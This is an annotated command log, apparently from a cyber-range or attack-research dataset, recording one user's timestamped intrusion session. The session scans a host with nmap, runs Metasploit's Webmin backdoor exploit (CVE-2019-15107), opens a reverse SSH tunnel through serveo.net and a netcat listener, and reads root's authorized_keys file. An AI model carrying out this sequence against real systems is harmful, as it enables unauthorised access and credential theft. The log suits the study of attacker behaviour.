User 77 start time 1594797635 end 1594811243
PADDING
PADDING
PADDING
INPUT|77--0|U|1594797635|77|ip a|OUTPUT
INPUT|77--1|U|1594797645|77|ping ..|OUTPUT
INPUT|77--2|U|1594797651|77|ping 8.8.8.8|OUTPUT
INPUT|77--3|U|1594797735|77|namp 172.18.1.5 -A|OUTPUT
INPUT|77--4|M0 |1594797860|77|nmap 172.18.1.5 -A|OUTPUT
INPUT|77--5|A16 |1594797964|77|systemctl start ssh|OUTPUT
INPUT|77--6|A16 |1594797971|77|ssh -R blabla:22:127.0.0.1:22 serveo.net|OUTPUT
INPUT|77--7|U|1594798103|77|curl 172.18.1.5:10000|OUTPUT
INPUT|77--8|A16 |1594798225|77|ssh root@127.0.0.1|OUTPUT
INPUT|77--9|A16 |1594798454|77|ssh -R blabla:22:127.0.0.1:22 serveo.net|OUTPUT
INPUT|77--10|A16 |1594798494|77|ssh -R 6666:127.0.0.1:22 serveo.net|OUTPUT
INPUT|77--11|A16 |1594798546|77|vim /etc/ssh/sshd_config|OUTPUT
INPUT|77--12|A16 |1594798565|77|systemctl restart ssh|OUTPUT
INPUT|77--13|U|1594798593|77|vim|OUTPUT
INPUT|77--14|U|1594798596|77|ll|OUTPUT
INPUT|77--15|V0 |1594798614|77|nmap -p 10000 -A 172.18.1.5|OUTPUT
INPUT|77--16|M2 |1594798785|77|msfconsole|OUTPUT
INPUT|77--17|A3 |1594798821|77|search CVE-2019-15107|OUTPUT
INPUT|77--18|M8 |1594798826|77|use exploit/unix/webapp/webmin_backdoor|OUTPUT
INPUT|77--19|A5 |1594798846|77|show|OUTPUT
INPUT|77--20|M5 |1594798866|77|show options|OUTPUT
INPUT|77--21|M6 |1594798908|77|set LHOST 172.18.1.5|OUTPUT
INPUT|77--22|V5 |1594798910|77|show options|OUTPUT
INPUT|77--23|U|1594798919|77|back|OUTPUT
INPUT|77--24|V8 |1594798931|77|use exploit/unix/webapp/webmin_backdoor|OUTPUT
INPUT|77--25|V6 |1594798939|77|set RHOSTS 172.18.1.5|OUTPUT
INPUT|77--26|V8 |1594798954|77|run|OUTPUT
INPUT|77--27|A6 |1594798973|77|set LPORT 6666|OUTPUT
INPUT|77--28|V8 |1594798977|77|run|OUTPUT
INPUT|77--29|V6 |1594798987|77|set LHOST 0.0.0.0|OUTPUT
INPUT|77--30|V8 |1594798992|77|run|OUTPUT
INPUT|77--31|U|1594798997|77|sessions -i|OUTPUT
INPUT|77--32|U|1594798999|77|sessions|OUTPUT
INPUT|77--33|U|1594799011|77|ip a|OUTPUT
INPUT|77--34|V5 |1594799019|77|show options|OUTPUT
INPUT|77--35|V6 |1594799026|77|set LHOST 192.168.130.188|OUTPUT
INPUT|77--36|A6 |1594799040|77|set SRVHOST 192.168.130.188|OUTPUT
INPUT|77--37|V8 |1594799091|77|run|OUTPUT
INPUT|77--38|V2 |1594799095|77|msfconsole|OUTPUT
INPUT|77--39|V8 |1594799109|77|use exploit/unix/webapp/webmin_backdoor|OUTPUT
INPUT|77--40|V5 |1594799112|77|show options|OUTPUT
INPUT|77--41|V6 |1594799124|77|set RHOSTS 172.18.1.5|OUTPUT
INPUT|77--42|V8 |1594799130|77|run|OUTPUT
INPUT|77--43|U|1594799153|77|ip r|OUTPUT
INPUT|77--44|V6 |1594799190|77|set LHOST 10.1.135.83|OUTPUT
INPUT|77--45|V8 |1594799484|77|run|OUTPUT
INPUT|77--46|U|1594799629|77|nc -l -p 7777|OUTPUT
INPUT|77--47|U|1594799787|77|ll|OUTPUT
INPUT|77--48|A10 |1594799787|77|ls|OUTPUT
INPUT|77--49|U|1594799790|77|cd/|OUTPUT
INPUT|77--50|U|1594799791|77|cd /|OUTPUT
INPUT|77--51|A10 |1594799792|77|ls|OUTPUT
INPUT|77--52|U|1594799796|77|cd /root|OUTPUT
INPUT|77--53|A10 |1594799796|77|ls|OUTPUT
INPUT|77--54|A10 |1594799798|77|ls -hlA|OUTPUT
INPUT|77--55|U|1594799806|77|ll|OUTPUT
INPUT|77--56|A10 |1594799807|77|ls|OUTPUT
INPUT|77--57|A10 A16 |1594799809|77|ls .ssh|OUTPUT
INPUT|77--58|A1 A9 A11 A12 A16 A17 |1594799814|77|cat .ssh/autorized_keys|OUTPUT
INPUT|77--59|A1 A9 A11 A12 A16 A17 |1594799821|77|cat .ssh/authorized_keys|OUTPUT
INPUT|77--60|U|1594799849|77|history|OUTPUT
INPUT|77--61|A10 |1594799874|77|ls|OUTPUT
INPUT|77--62|U|1594799891|77|ip a|OUTPUT
INPUT|77--63|U|1594799897|77|ps aux|OUTPUT
INPUT|77--64|U|1594799900|77|ps aux|OUTPUT
INPUT|77--65|U|1594799919|77|w|OUTPUT
INPUT|77--66|U|1594799921|77|ps aux|OUTPUT
